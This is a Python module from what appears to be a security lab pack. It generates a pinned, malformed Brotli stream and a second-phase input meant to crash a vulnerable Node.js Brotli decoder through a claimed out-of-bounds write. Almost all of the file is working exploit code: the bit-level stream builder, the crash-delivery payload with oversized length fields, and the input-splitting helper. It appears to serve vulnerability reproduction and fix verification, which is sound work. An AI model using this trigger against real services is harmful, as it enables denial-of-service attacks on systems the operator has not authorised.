"""Pinned CVE-2026-111497 request payload for the Node2Shell managed lab.

The exploit request body is the canonical crash trigger for the Brotli
decoder out-of-bounds write (GHSA-9v8h-qqgm-4m35): a stream that declares a
single block type per category, then drives 2^24 insert-copy commands
without ever delivering the announced output, so a vulnerable decoder
confuses NEEDS_MORE_INPUT with invalid input and writes past the ring
buffer. A fixed decoder rejects it (FORMAT_BLOCK_SWITCH).

The trigger is generated here instead of shipped as bytes, and the SHA256 is
asserted on every build, so the pack cannot silently carry different input
than the reviewed repro. The mechanism and the pinned digest follow the
public reproducer published after the October 2026 Node.js security release;
no RCE grooming stages are included - the pack's claim is the verified
deterministic crash, not code execution.
"""

import hashlib

TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"

# The vulnerable decoder only reaches the unchecked-return path when the
# trigger is followed by three zero bytes and the stream is then ended with
# a short second input, exactly as a streaming consumer would feed it. The
# verified behavior (Node 22.23.3 vs 22.23.4): the two-phase input crashes
# the vulnerable runtime with SIGSEGV; the fixed runtime answers 422
# ERR__ERROR_FORMAT_BLOCK_SWITCH and stays healthy.
TRAILING_ZEROS = b"\x00\x00\x00"
SECOND_INPUT_LENGTH = 127


class _Bits:
    """Least-significant-bit-first writer for Brotli stream fields."""

    def __init__(self):
        self.data = bytearray()
        self.value = 0
        self.used = 0

    def put(self, value, count):
        for bit_index in range(count):
            self.value |= ((value >> bit_index) & 1) << self.used
            self.used += 1
            if self.used == 8:
                self.data.append(self.value)
                self.value = 0
                self.used = 0

    def aligned(self, value: bytes):
        if self.used:
            raise ValueError("writer is not byte-aligned")
        self.data.extend(value)

    def finish(self) -> bytes:
        if self.used:
            self.data.append(self.value)
            self.value = 0
            self.used = 0
        return bytes(self.data)


def _one_symbol_tree(bits, alphabet_size, symbol):
    bits.put(1, 2)
    bits.put(0, 2)
    bits.put(symbol, (alphabet_size - 1).bit_length())


def _varlen_u8(bits, value):
    if value == 0:
        bits.put(0, 1)
        return
    bits.put(1, 1)
    if value == 1:
        bits.put(0, 3)
        return
    width = value.bit_length() - 1
    bits.put(width, 3)
    bits.put(value - (1 << width), width)


def trigger_stream() -> bytes:
    """Build the malformed Brotli stream; the digest pin guards every build."""
    bits = _Bits()
    # Window bits, meta-block declaration (ISLAST=0, 4 nibbles, MLEN, not
    # uncompressed).
    bits.put(1, 1)
    bits.put(0, 3)
    bits.put(2, 3)
    bits.put(0, 1)
    bits.put(2, 2)
    bits.put(0xFFFFFF, 24)
    bits.put(0, 1)
    # One block type per category: no switch codes are announced.
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 1)
    _one_symbol_tree(bits, 4, 0)
    _one_symbol_tree(bits, 26, 25)
    bits.put(0xFFFFFF, 24)
    _varlen_u8(bits, 0)
    bits.put(3, 6)
    bits.put(0, 2)
    _varlen_u8(bits, 0)
    _varlen_u8(bits, 0)
    _one_symbol_tree(bits, 256, 0)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 704, 130)
    _one_symbol_tree(bits, 400, 184)
    # 2^24 insert-copy commands whose announced output is never delivered.
    distance_extra = 4
    command_count = 1 << 24
    completed = 0
    while bits.used and completed < command_count:
        bits.put(distance_extra, 11)
        completed += 1
    group = _Bits()
    for _ in range(8):
        group.put(distance_extra, 11)
    group_bytes = group.finish()
    groups, tail = divmod(command_count - completed, 8)
    bits.aligned(group_bytes * groups)
    for _ in range(tail):
        bits.put(distance_extra, 11)
    stream = bits.finish()
    digest = hashlib.sha256(stream).hexdigest()
    if digest != TRIGGER_SHA256:
        raise RuntimeError(f"trigger digest mismatch: {digest}")
    return stream


def second_input() -> bytes:
    """The short final input that ends the stream; verified crash delivery."""
    payload = bytearray(SECOND_INPUT_LENGTH)
    payload[7] = 8
    payload[15:19] = (0x7FFFFFFF).to_bytes(4, "little", signed=True)
    payload[19:23] = (0x7FFFFFFF).to_bytes(4, "little")
    payload[23:27] = (0x7FFFFFFF).to_bytes(4, "little")
    return bytes(payload)


def split_input(body: bytes) -> tuple[int, int]:
    """Return the (first, second) phase cut used by the reviewed lab app."""
    first = len(trigger_stream()) + len(TRAILING_ZEROS)
    return first, len(body) - first
